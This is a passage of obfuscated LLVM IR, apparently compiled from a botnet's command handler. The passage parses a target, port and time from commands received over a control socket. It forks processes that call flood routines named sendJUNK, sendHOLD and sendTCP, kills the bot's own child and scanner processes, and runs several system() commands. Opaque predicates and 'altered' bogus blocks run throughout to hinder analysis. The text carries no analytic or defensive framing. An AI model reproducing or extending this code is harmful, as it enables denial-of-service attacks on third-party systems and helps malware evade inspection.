  %946 = load i32, i32* @x.79
  %947 = load i32, i32* @y.80
  %948 = sub i32 %946, 1
  %949 = mul i32 %946, %948
  %950 = urem i32 %949, 2
  %951 = icmp eq i32 %950, 0
  %952 = icmp slt i32 %947, 10
  %953 = or i1 %951, %952
  br i1 %953, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %945, label %954, label %971

; <label>:954:                                    ; preds = %originalBBpart2116, %926, %923
  %955 = load i32, i32* @x.79
  %956 = load i32, i32* @y.80
  %957 = sub i32 %955, 1
  %958 = mul i32 %955, %957
  %959 = urem i32 %958, 2
  %960 = icmp eq i32 %959, 0
  %961 = icmp slt i32 %956, 10
  %962 = or i1 %960, %961
  br i1 %962, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %954
  %963 = load i32, i32* @x.79
  %964 = load i32, i32* @y.80
  %965 = sub i32 %963, 1
  %966 = mul i32 %963, %965
  %967 = urem i32 %966, 2
  %968 = icmp eq i32 %967, 0
  %969 = icmp slt i32 %964, 10
  %970 = or i1 %968, %969
  br i1 %970, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %1413

; <label>:971:                                    ; preds = %originalBBpart2116
  %972 = load i8**, i8*** %4, align 8
  %973 = getelementptr inbounds i8*, i8** %972, i64 1
  %974 = load i8*, i8** %973, align 8
  store i8* %974, i8** %26, align 8
  %975 = load i8**, i8*** %4, align 8
  %976 = getelementptr inbounds i8*, i8** %975, i64 2
  %977 = load i8*, i8** %976, align 8
  %978 = call i32 @atoi(i8* %977) #10
  store i32 %978, i32* %27, align 4
  %979 = load i8**, i8*** %4, align 8
  %980 = getelementptr inbounds i8*, i8** %979, i64 3
  %981 = load i8*, i8** %980, align 8
  %982 = call i32 @atoi(i8* %981) #10
  store i32 %982, i32* %28, align 4
  %983 = load i8*, i8** %26, align 8
  %984 = call i8* @strstr(i8* %983, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %985 = icmp ne i8* %984, null
  br i1 %985, label %986, label %1007

; <label>:986:                                    ; preds = %971
  %987 = load i8*, i8** %26, align 8
  %988 = call i8* @strtok(i8* %987, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %988, i8** %29, align 8
  br label %989

; <label>:989:                                    ; preds = %1004, %986
  %990 = load i8*, i8** %29, align 8
  %991 = icmp ne i8* %990, null
  br i1 %991, label %992, label %1006

; <label>:992:                                    ; preds = %989
  %993 = call i32 @listFork()
  %994 = icmp ne i32 %993, 0
  br i1 %994, label %1004, label %995

; <label>:995:                                    ; preds = %992
  %996 = load i8*, i8** %29, align 8
  %997 = load i32, i32* %27, align 4
  %998 = load i32, i32* %28, align 4
  call void @sendJUNK(i8* %996, i32 %997, i32 %998)
  %999 = load i8*, i8** %29, align 8
  %1000 = load i32, i32* %27, align 4
  %1001 = load i32, i32* %28, align 4
  call void @sendHOLD(i8* %999, i32 %1000, i32 %1001)
  %1002 = load i32, i32* @mainCommSock, align 4
  %1003 = call i32 @close(i32 %1002)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1004:                                   ; preds = %992
  %1005 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %1005, i8** %29, align 8
  br label %989

; <label>:1006:                                   ; preds = %989
  br label %1034

; <label>:1007:                                   ; preds = %971
  %1008 = call i32 @listFork()
  %1009 = icmp ne i32 %1008, 0
  br i1 %1009, label %1010, label %1027

; <label>:1010:                                   ; preds = %1007
  %1011 = load i32, i32* @x.79
  %1012 = load i32, i32* @y.80
  %1013 = sub i32 %1011, 1
  %1014 = mul i32 %1011, %1013
  %1015 = urem i32 %1014, 2
  %1016 = icmp eq i32 %1015, 0
  %1017 = icmp slt i32 %1012, 10
  %1018 = or i1 %1016, %1017
  br i1 %1018, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1010
  %1019 = load i32, i32* @x.79
  %1020 = load i32, i32* @y.80
  %1021 = sub i32 %1019, 1
  %1022 = mul i32 %1019, %1021
  %1023 = urem i32 %1022, 2
  %1024 = icmp eq i32 %1023, 0
  %1025 = icmp slt i32 %1020, 10
  %1026 = or i1 %1024, %1025
  br i1 %1026, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %1413

; <label>:1027:                                   ; preds = %1007
  %1028 = load i8*, i8** %26, align 8
  %1029 = load i32, i32* %27, align 4
  %1030 = load i32, i32* %28, align 4
  call void @sendJUNK(i8* %1028, i32 %1029, i32 %1030)
  %1031 = load i8*, i8** %26, align 8
  %1032 = load i32, i32* %27, align 4
  %1033 = load i32, i32* %28, align 4
  call void @sendHOLD(i8* %1031, i32 %1032, i32 %1033)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1034:                                   ; preds = %1006
  br label %1035

; <label>:1035:                                   ; preds = %1034, %originalBBpart2112
  %1036 = load i8**, i8*** %4, align 8
  %1037 = getelementptr inbounds i8*, i8** %1036, i64 0
  %1038 = load i8*, i8** %1037, align 8
  %1039 = call i32 @strcmp(i8* %1038, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %1040 = icmp ne i32 %1039, 0
  br i1 %1040, label %1274, label %1041

; <label>:1041:                                   ; preds = %1035
  %1042 = load i32, i32* %3, align 4
  %1043 = icmp slt i32 %1042, 6
  br i1 %1043, label %1122, label %1044

; <label>:1044:                                   ; preds = %1041
  %1045 = load i8**, i8*** %4, align 8
  %1046 = getelementptr inbounds i8*, i8** %1045, i64 3
  %1047 = load i8*, i8** %1046, align 8
  %1048 = call i32 @atoi(i8* %1047) #10
  %1049 = icmp eq i32 %1048, -1
  br i1 %1049, label %1122, label %1050

; <label>:1050:                                   ; preds = %1044
  %1051 = load i8**, i8*** %4, align 8
  %1052 = getelementptr inbounds i8*, i8** %1051, i64 2
  %1053 = load i8*, i8** %1052, align 8
  %1054 = call i32 @atoi(i8* %1053) #10
  %1055 = icmp eq i32 %1054, -1
  br i1 %1055, label %1122, label %1056

; <label>:1056:                                   ; preds = %1050
  %1057 = load i32, i32* @x.79
  %1058 = load i32, i32* @y.80
  %1059 = sub i32 %1057, 1
  %1060 = mul i32 %1057, %1059
  %1061 = urem i32 %1060, 2
  %1062 = icmp eq i32 %1061, 0
  %1063 = icmp slt i32 %1058, 10
  %1064 = or i1 %1062, %1063
  br i1 %1064, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1056
  %1065 = load i32, i32* %3, align 4
  %1066 = icmp sgt i32 %1065, 5
  %1067 = load i32, i32* @x.79
  %1068 = load i32, i32* @y.80
  %1069 = sub i32 %1067, 1
  %1070 = mul i32 %1067, %1069
  %1071 = urem i32 %1070, 2
  %1072 = icmp eq i32 %1071, 0
  %1073 = icmp slt i32 %1068, 10
  %1074 = or i1 %1072, %1073
  br i1 %1074, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %1066, label %1075, label %1081

; <label>:1075:                                   ; preds = %originalBBpart2128
  %1076 = load i8**, i8*** %4, align 8
  %1077 = getelementptr inbounds i8*, i8** %1076, i64 5
  %1078 = load i8*, i8** %1077, align 8
  %1079 = call i32 @atoi(i8* %1078) #10
  %1080 = icmp slt i32 %1079, 0
  br i1 %1080, label %1122, label %1081

; <label>:1081:                                   ; preds = %1075, %originalBBpart2128
  %1082 = load i32, i32* @x.79
  %1083 = load i32, i32* @y.80
  %1084 = sub i32 %1082, 1
  %1085 = mul i32 %1082, %1084
  %1086 = urem i32 %1085, 2
  %1087 = icmp eq i32 %1086, 0
  %1088 = icmp slt i32 %1083, 10
  %1089 = or i1 %1087, %1088
  br i1 %1089, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1081
  %1090 = load i32, i32* %3, align 4
  %1091 = icmp eq i32 %1090, 7
  %1092 = load i32, i32* @x.79
  %1093 = load i32, i32* @y.80
  %1094 = sub i32 %1092, 1
  %1095 = mul i32 %1092, %1094
  %1096 = urem i32 %1095, 2
  %1097 = icmp eq i32 %1096, 0
  %1098 = icmp slt i32 %1093, 10
  %1099 = or i1 %1097, %1098
  br i1 %1099, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1091, label %1100, label %1123

; <label>:1100:                                   ; preds = %originalBBpart2132
  %1101 = load i32, i32* @x.79
  %1102 = load i32, i32* @y.80
  %1103 = sub i32 %1101, 1
  %1104 = mul i32 %1101, %1103
  %1105 = urem i32 %1104, 2
  %1106 = icmp eq i32 %1105, 0
  %1107 = icmp slt i32 %1102, 10
  %1108 = or i1 %1106, %1107
  br i1 %1108, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1100
  %1109 = load i8**, i8*** %4, align 8
  %1110 = getelementptr inbounds i8*, i8** %1109, i64 6
  %1111 = load i8*, i8** %1110, align 8
  %1112 = call i32 @atoi(i8* %1111) #10
  %1113 = icmp slt i32 %1112, 1
  %1114 = load i32, i32* @x.79
  %1115 = load i32, i32* @y.80
  %1116 = sub i32 %1114, 1
  %1117 = mul i32 %1114, %1116
  %1118 = urem i32 %1117, 2
  %1119 = icmp eq i32 %1118, 0
  %1120 = icmp slt i32 %1115, 10
  %1121 = or i1 %1119, %1120
  br i1 %1121, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1113, label %1122, label %1123

; <label>:1122:                                   ; preds = %originalBBpart2136, %1075, %1050, %1044, %1041
  br label %1413

; <label>:1123:                                   ; preds = %originalBBpart2136, %originalBBpart2132
  %1124 = load i8**, i8*** %4, align 8
  %1125 = getelementptr inbounds i8*, i8** %1124, i64 1
  %1126 = load i8*, i8** %1125, align 8
  store i8* %1126, i8** %30, align 8
  %1127 = load i8**, i8*** %4, align 8
  %1128 = getelementptr inbounds i8*, i8** %1127, i64 2
  %1129 = load i8*, i8** %1128, align 8
  %1130 = call i32 @atoi(i8* %1129) #10
  store i32 %1130, i32* %31, align 4
  %1131 = load i8**, i8*** %4, align 8
  %1132 = getelementptr inbounds i8*, i8** %1131, i64 3
  %1133 = load i8*, i8** %1132, align 8
  %1134 = call i32 @atoi(i8* %1133) #10
  store i32 %1134, i32* %32, align 4
  %1135 = load i8**, i8*** %4, align 8
  %1136 = getelementptr inbounds i8*, i8** %1135, i64 4
  %1137 = load i8*, i8** %1136, align 8
  store i8* %1137, i8** %33, align 8
  %1138 = load i32, i32* %3, align 4
  %1139 = icmp eq i32 %1138, 7
  br i1 %1139, label %1140, label %1145

; <label>:1140:                                   ; preds = %1123
  %1141 = load i8**, i8*** %4, align 8
  %1142 = getelementptr inbounds i8*, i8** %1141, i64 6
  %1143 = load i8*, i8** %1142, align 8
  %1144 = call i32 @atoi(i8* %1143) #10
  br label %1146

; <label>:1145:                                   ; preds = %1123
  br label %1146

; <label>:1146:                                   ; preds = %1145, %1140
  %1147 = phi i32 [ %1144, %1140 ], [ 10, %1145 ]
  store i32 %1147, i32* %34, align 4
  %1148 = load i32, i32* %3, align 4
  %1149 = icmp sgt i32 %1148, 5
  br i1 %1149, label %1150, label %1171

; <label>:1150:                                   ; preds = %1146
  %1151 = load i32, i32* @x.79
  %1152 = load i32, i32* @y.80
  %1153 = sub i32 %1151, 1
  %1154 = mul i32 %1151, %1153
  %1155 = urem i32 %1154, 2
  %1156 = icmp eq i32 %1155, 0
  %1157 = icmp slt i32 %1152, 10
  %1158 = or i1 %1156, %1157
  br i1 %1158, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1150
  %1159 = load i8**, i8*** %4, align 8
  %1160 = getelementptr inbounds i8*, i8** %1159, i64 5
  %1161 = load i8*, i8** %1160, align 8
  %1162 = call i32 @atoi(i8* %1161) #10
  %1163 = load i32, i32* @x.79
  %1164 = load i32, i32* @y.80
  %1165 = sub i32 %1163, 1
  %1166 = mul i32 %1163, %1165
  %1167 = urem i32 %1166, 2
  %1168 = icmp eq i32 %1167, 0
  %1169 = icmp slt i32 %1164, 10
  %1170 = or i1 %1168, %1169
  br i1 %1170, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1172

; <label>:1171:                                   ; preds = %1146
  br label %1172

; <label>:1172:                                   ; preds = %1171, %originalBBpart2140
  %1173 = phi i32 [ %1162, %originalBBpart2140 ], [ 0, %1171 ]
  store i32 %1173, i32* %35, align 4
  store i32 32, i32* %36, align 4
  %1174 = load i8*, i8** %30, align 8
  %1175 = call i8* @strstr(i8* %1174, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %1176 = icmp ne i8* %1175, null
  br i1 %1176, label %1177, label %1245

; <label>:1177:                                   ; preds = %1172
  %1178 = load i8*, i8** %30, align 8
  %1179 = call i8* @strtok(i8* %1178, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %1179, i8** %37, align 8
  br label %1180

; <label>:1180:                                   ; preds = %1226, %1177
  %1181 = load i32, i32* @x.79
  %1182 = load i32, i32* @y.80
  %1183 = sub i32 %1181, 1
  %1184 = mul i32 %1181, %1183
  %1185 = urem i32 %1184, 2
  %1186 = icmp eq i32 %1185, 0
  %1187 = icmp slt i32 %1182, 10
  %1188 = or i1 %1186, %1187
  br i1 %1188, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1180
  %1189 = load i8*, i8** %37, align 8
  %1190 = icmp ne i8* %1189, null
  %1191 = load i32, i32* @x.79
  %1192 = load i32, i32* @y.80
  %1193 = sub i32 %1191, 1
  %1194 = mul i32 %1191, %1193
  %1195 = urem i32 %1194, 2
  %1196 = icmp eq i32 %1195, 0
  %1197 = icmp slt i32 %1192, 10
  %1198 = or i1 %1196, %1197
  br i1 %1198, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1190, label %1199, label %1228

; <label>:1199:                                   ; preds = %originalBBpart2144
  %1200 = call i32 @listFork()
  %1201 = icmp ne i32 %1200, 0
  br i1 %1201, label %1226, label %1202

; <label>:1202:                                   ; preds = %1199
  %1203 = load i32, i32* @x.79
  %1204 = load i32, i32* @y.80
  %1205 = sub i32 %1203, 1
  %1206 = mul i32 %1203, %1205
  %1207 = urem i32 %1206, 2
  %1208 = icmp eq i32 %1207, 0
  %1209 = icmp slt i32 %1204, 10
  %1210 = or i1 %1208, %1209
  br i1 %1210, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1202
  %1211 = load i8*, i8** %37, align 8
  %1212 = load i32, i32* %31, align 4
  %1213 = load i32, i32* %32, align 4
  %1214 = load i8*, i8** %33, align 8
  %1215 = load i32, i32* %35, align 4
  %1216 = load i32, i32* %34, align 4
  %1217 = load i32, i32* %36, align 4
  call void @sendTCP(i8* %1211, i32 %1212, i32 %1213, i8* %1214, i32 %1215, i32 %1216, i32 %1217)
  call void @_exit(i32 0) #12
  %1218 = load i32, i32* @x.79
  %1219 = load i32, i32* @y.80
  %1220 = sub i32 %1218, 1
  %1221 = mul i32 %1218, %1220
  %1222 = urem i32 %1221, 2
  %1223 = icmp eq i32 %1222, 0
  %1224 = icmp slt i32 %1219, 10
  %1225 = or i1 %1223, %1224
  br i1 %1225, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  unreachable

; <label>:1226:                                   ; preds = %1199
  %1227 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %1227, i8** %37, align 8
  br label %1180

; <label>:1228:                                   ; preds = %originalBBpart2144
  %1229 = load i32, i32* @x.79
  %1230 = load i32, i32* @y.80
  %1231 = sub i32 %1229, 1
  %1232 = mul i32 %1229, %1231
  %1233 = urem i32 %1232, 2
  %1234 = icmp eq i32 %1233, 0
  %1235 = icmp slt i32 %1230, 10
  %1236 = or i1 %1234, %1235
  br i1 %1236, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1228
  %1237 = load i32, i32* @x.79
  %1238 = load i32, i32* @y.80
  %1239 = sub i32 %1237, 1
  %1240 = mul i32 %1237, %1239
  %1241 = urem i32 %1240, 2
  %1242 = icmp eq i32 %1241, 0
  %1243 = icmp slt i32 %1238, 10
  %1244 = or i1 %1242, %1243
  br i1 %1244, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1273

; <label>:1245:                                   ; preds = %1172
  %1246 = load i32, i32* @x.79
  %1247 = load i32, i32* @y.80
  %1248 = sub i32 %1246, 1
  %1249 = mul i32 %1246, %1248
  %1250 = urem i32 %1249, 2
  %1251 = icmp eq i32 %1250, 0
  %1252 = icmp slt i32 %1247, 10
  %1253 = or i1 %1251, %1252
  br i1 %1253, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1245
  %1254 = call i32 @listFork()
  %1255 = icmp ne i32 %1254, 0
  %1256 = load i32, i32* @x.79
  %1257 = load i32, i32* @y.80
  %1258 = sub i32 %1256, 1
  %1259 = mul i32 %1256, %1258
  %1260 = urem i32 %1259, 2
  %1261 = icmp eq i32 %1260, 0
  %1262 = icmp slt i32 %1257, 10
  %1263 = or i1 %1261, %1262
  br i1 %1263, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1255, label %1264, label %1265

; <label>:1264:                                   ; preds = %originalBBpart2156
  br label %1413

; <label>:1265:                                   ; preds = %originalBBpart2156
  %1266 = load i8*, i8** %30, align 8
  %1267 = load i32, i32* %31, align 4
  %1268 = load i32, i32* %32, align 4
  %1269 = load i8*, i8** %33, align 8
  %1270 = load i32, i32* %35, align 4
  %1271 = load i32, i32* %34, align 4
  %1272 = load i32, i32* %36, align 4
  call void @sendTCP(i8* %1266, i32 %1267, i32 %1268, i8* %1269, i32 %1270, i32 %1271, i32 %1272)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1273:                                   ; preds = %originalBBpart2152
  br label %1274

; <label>:1274:                                   ; preds = %1273, %1035
  %1275 = load i8**, i8*** %4, align 8
  %1276 = getelementptr inbounds i8*, i8** %1275, i64 0
  %1277 = load i8*, i8** %1276, align 8
  %1278 = call i32 @strcmp(i8* %1277, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.106, i32 0, i32 0)) #10
  %1279 = icmp ne i32 %1278, 0
  br i1 %1279, label %1359, label %1280

; <label>:1280:                                   ; preds = %1274
  %1281 = load i32, i32* @x.79
  %1282 = load i32, i32* @y.80
  %1283 = sub i32 %1281, 1
  %1284 = mul i32 %1281, %1283
  %1285 = urem i32 %1284, 2
  %1286 = icmp eq i32 %1285, 0
  %1287 = icmp slt i32 %1282, 10
  %1288 = or i1 %1286, %1287
  br i1 %1288, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1280
  store i32 0, i32* %38, align 4
  store i64 0, i64* %39, align 8
  %1289 = load i32, i32* @x.79
  %1290 = load i32, i32* @y.80
  %1291 = sub i32 %1289, 1
  %1292 = mul i32 %1289, %1291
  %1293 = urem i32 %1292, 2
  %1294 = icmp eq i32 %1293, 0
  %1295 = icmp slt i32 %1290, 10
  %1296 = or i1 %1294, %1295
  br i1 %1296, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %1297

; <label>:1297:                                   ; preds = %1355, %originalBBpart2160
  %1298 = load i32, i32* @x.79
  %1299 = load i32, i32* @y.80
  %1300 = sub i32 %1298, 1
  %1301 = mul i32 %1298, %1300
  %1302 = urem i32 %1301, 2
  %1303 = icmp eq i32 %1302, 0
  %1304 = icmp slt i32 %1299, 10
  %1305 = or i1 %1303, %1304
  br i1 %1305, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1297
  %1306 = load i64, i64* %39, align 8
  %1307 = load i64, i64* @numpids, align 8
  %1308 = icmp ult i64 %1306, %1307
  %1309 = load i32, i32* @x.79
  %1310 = load i32, i32* @y.80
  %1311 = sub i32 %1309, 1
  %1312 = mul i32 %1309, %1311
  %1313 = urem i32 %1312, 2
  %1314 = icmp eq i32 %1313, 0
  %1315 = icmp slt i32 %1310, 10
  %1316 = or i1 %1314, %1315
  br i1 %1316, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1308, label %1317, label %1358

; <label>:1317:                                   ; preds = %originalBBpart2164
  %1318 = load i32*, i32** @pids, align 8
  %1319 = load i64, i64* %39, align 8
  %1320 = getelementptr inbounds i32, i32* %1318, i64 %1319
  %1321 = load i32, i32* %1320, align 4
  %1322 = icmp ne i32 %1321, 0
  br i1 %1322, label %1323, label %1354

; <label>:1323:                                   ; preds = %1317
  %1324 = load i32*, i32** @pids, align 8
  %1325 = load i64, i64* %39, align 8
  %1326 = getelementptr inbounds i32, i32* %1324, i64 %1325
  %1327 = load i32, i32* %1326, align 4
  %1328 = call i32 @getpid() #2
  %1329 = icmp ne i32 %1327, %1328
  br i1 %1329, label %1330, label %1354

; <label>:1330:                                   ; preds = %1323
  %1331 = load i32, i32* @x.79
  %1332 = load i32, i32* @y.80
  %1333 = sub i32 %1331, 1
  %1334 = mul i32 %1331, %1333
  %1335 = urem i32 %1334, 2
  %1336 = icmp eq i32 %1335, 0
  %1337 = icmp slt i32 %1332, 10
  %1338 = or i1 %1336, %1337
  br i1 %1338, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1330
  %1339 = load i32*, i32** @pids, align 8
  %1340 = load i64, i64* %39, align 8
  %1341 = getelementptr inbounds i32, i32* %1339, i64 %1340
  %1342 = load i32, i32* %1341, align 4
  %1343 = call i32 @kill(i32 %1342, i32 9) #2
  %1344 = load i32, i32* %38, align 4
  %1345 = add nsw i32 %1344, 1
  store i32 %1345, i32* %38, align 4
  %1346 = load i32, i32* @x.79
  %1347 = load i32, i32* @y.80
  %1348 = sub i32 %1346, 1
  %1349 = mul i32 %1346, %1348
  %1350 = urem i32 %1349, 2
  %1351 = icmp eq i32 %1350, 0
  %1352 = icmp slt i32 %1347, 10
  %1353 = or i1 %1351, %1352
  br i1 %1353, label %originalBBpart2173, label %originalBB166alteredBB

originalBBpart2173:                               ; preds = %originalBB166
  br label %1354

; <label>:1354:                                   ; preds = %originalBBpart2173, %1323, %1317
  br label %1355

; <label>:1355:                                   ; preds = %1354
  %1356 = load i64, i64* %39, align 8
  %1357 = add i64 %1356, 1
  store i64 %1357, i64* %39, align 8
  br label %1297

; <label>:1358:                                   ; preds = %originalBBpart2164
  br label %1359

; <label>:1359:                                   ; preds = %1358, %1274
  %1360 = load i8**, i8*** %4, align 8
  %1361 = getelementptr inbounds i8*, i8** %1360, i64 0
  %1362 = load i8*, i8** %1361, align 8
  %1363 = call i32 @strcmp(i8* %1362, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.107, i32 0, i32 0)) #10
  %1364 = icmp ne i32 %1363, 0
  br i1 %1364, label %1382, label %1365

; <label>:1365:                                   ; preds = %1359
  %1366 = load i32, i32* @x.79
  %1367 = load i32, i32* @y.80
  %1368 = sub i32 %1366, 1
  %1369 = mul i32 %1366, %1368
  %1370 = urem i32 %1369, 2
  %1371 = icmp eq i32 %1370, 0
  %1372 = icmp slt i32 %1367, 10
  %1373 = or i1 %1371, %1372
  br i1 %1373, label %originalBB175, label %originalBB175alteredBB

originalBB175:                                    ; preds = %originalBB175alteredBB, %1365
  call void @exit(i32 0) #14
  %1374 = load i32, i32* @x.79
  %1375 = load i32, i32* @y.80
  %1376 = sub i32 %1374, 1
  %1377 = mul i32 %1374, %1376
  %1378 = urem i32 %1377, 2
  %1379 = icmp eq i32 %1378, 0
  %1380 = icmp slt i32 %1375, 10
  %1381 = or i1 %1379, %1380
  br i1 %1381, label %originalBBpart2177, label %originalBB175alteredBB

originalBBpart2177:                               ; preds = %originalBB175
  unreachable

; <label>:1382:                                   ; preds = %1359
  %1383 = load i8**, i8*** %4, align 8
  %1384 = getelementptr inbounds i8*, i8** %1383, i64 0
  %1385 = load i8*, i8** %1384, align 8
  %1386 = call i32 @strcmp(i8* %1385, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.108, i32 0, i32 0)) #10
  %1387 = icmp ne i32 %1386, 0
  br i1 %1387, label %1413, label %1388

; <label>:1388:                                   ; preds = %1382
  %1389 = load i32, i32* @x.79
  %1390 = load i32, i32* @y.80
  %1391 = sub i32 %1389, 1
  %1392 = mul i32 %1389, %1391
  %1393 = urem i32 %1392, 2
  %1394 = icmp eq i32 %1393, 0
  %1395 = icmp slt i32 %1390, 10
  %1396 = or i1 %1394, %1395
  br i1 %1396, label %originalBB179, label %originalBB179alteredBB

originalBB179:                                    ; preds = %originalBB179alteredBB, %1388
  %1397 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i32 0, i32 0))
  %1398 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0))
  %1399 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i32 0, i32 0))
  %1400 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i32 0, i32 0))
  %1401 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.113, i32 0, i32 0))
  %1402 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i32 0, i32 0))
  %1403 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.115, i32 0, i32 0))
  %1404 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.116, i32 0, i32 0))
  %1405 = load i32, i32* @x.79
  %1406 = load i32, i32* @y.80
  %1407 = sub i32 %1405, 1
  %1408 = mul i32 %1405, %1407
  %1409 = urem i32 %1408, 2
  %1410 = icmp eq i32 %1409, 0
  %1411 = icmp slt i32 %1406, 10
  %1412 = or i1 %1410, %1411
  br i1 %1412, label %originalBBpart2181, label %originalBB179alteredBB

originalBBpart2181:                               ; preds = %originalBB179
  br label %1413

; <label>:1413:                                   ; preds = %originalBBpart2181, %1382, %1264, %1122, %originalBBpart2124, %originalBBpart2120, %879, %810, %originalBBpart292, %729, %683, %567, %471, %402, %295, %228, %185, %originalBBpart216, %143, %112, %100, %86, %originalBBpart2
  %1414 = load i32, i32* @x.79
  %1415 = load i32, i32* @y.80
  %1416 = sub i32 %1414, 1
  %1417 = mul i32 %1414, %1416
  %1418 = urem i32 %1417, 2
  %1419 = icmp eq i32 %1418, 0
  %1420 = icmp slt i32 %1415, 10
  %1421 = or i1 %1419, %1420
  br i1 %1421, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %1413
  %1422 = load i32, i32* @x.79
  %1423 = load i32, i32* @y.80
  %1424 = sub i32 %1422, 1
  %1425 = mul i32 %1422, %1424
  %1426 = urem i32 %1425, 2
  %1427 = icmp eq i32 %1426, 0
  %1428 = icmp slt i32 %1423, 10
  %1429 = or i1 %1427, %1428
  br i1 %1429, label %originalBBpart2185, label %originalBB183alteredBB

originalBBpart2185:                               ; preds = %originalBB183
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %45
  %1430 = load i32, i32* @mainCommSock, align 4
  %1431 = call i32 (i32, i8*, ...) @sockprintf(i32 %1430, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.90, i32 0, i32 0))
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %64
  %1432 = load i8**, i8*** %4, align 8
  %1433 = getelementptr inbounds i8*, i8** %1432, i64 0
  %1434 = load i8*, i8** %1433, align 8
  %1435 = call i32 @strcmp(i8* %1434, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.91, i32 0, i32 0)) #10
  %1436 = icmp ne i32 %1435, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %113
  %1437 = load i32, i32* @scanPid, align 4
  %1438 = call i32 @kill(i32 %1437, i32 9) #2
  %1439 = load i32, i32* @mainCommSock, align 4
  %1440 = call i32 (i32, i8*, ...) @sockprintf(i32 %1439, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.96, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %144
  %1441 = call i32 @fork() #2
  store i32 %1441, i32* %6, align 4
  %1442 = load i32, i32* %6, align 4
  %1443 = icmp ugt i32 %1442, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %164
  %1444 = load i32, i32* %6, align 4
  store i32 %1444, i32* @scanPid, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %190
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %247
  %1445 = load i8*, i8** %10, align 8
  %1446 = icmp ne i8* %1445, null
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %269
  %1447 = load i8*, i8** %10, align 8
  %1448 = load i32, i32* %8, align 4
  %1449 = load i32, i32* %9, align 4
